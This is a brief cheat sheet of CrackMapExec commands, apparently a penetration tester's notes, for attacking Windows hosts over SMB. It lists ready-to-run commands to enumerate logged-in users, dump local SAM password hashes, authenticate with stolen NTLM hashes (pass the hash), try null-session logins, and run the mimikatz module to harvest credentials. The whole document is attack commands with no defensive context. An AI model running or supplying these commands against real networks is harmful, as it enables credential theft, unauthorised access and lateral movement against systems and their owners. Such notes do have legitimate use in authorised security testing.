# check logged in users

```bash
crackmapexec <target(s)> -u 'Administrator' -p 'PASS' --lusers
```

# dumping local SAM hashes

```bash
crackmapexec <target(s)> -u 'Administrator' -p 'PASS' --local-auth --sam
```

# pass the hash

```bash
crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
crackmapexec smb <target(s)> -u username -H NTHASH
```

# login with null session

```bash
crackmapexec smb <target(s)> -u '' -p ''
```

# modules

## list modules

```bash
crackmapexec -L
```

## use module

```bash
crackmapexec <protocol> <target(s)> -M <module name>.
crackmapexec smb <target(s)> -u Administrator -p 'PASS' -M mimikatz
```

## see module options

```bash
crackmapexec <protocol> -M <module name> --options
crackmapexec smb -M mimikatz --options
```

## using module options

```bash
crackmapexec <protocol> <target(s)> -u Administrator -p 'PASS' -M mimikatz -o COMMAND='privilege::debug'
```
